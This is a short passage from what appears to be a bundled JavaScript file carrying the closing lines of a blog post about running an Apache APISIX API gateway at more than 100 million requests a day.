iterative functions contributed.\\n\\nNow the daily traffic of the gateway has exceeded 100 million, and there is no performance problem. If the traffic can reach one billion, I will share Apache APISIX and my way forward in the future. Welcome everyone to pay attention."}]}')}}]);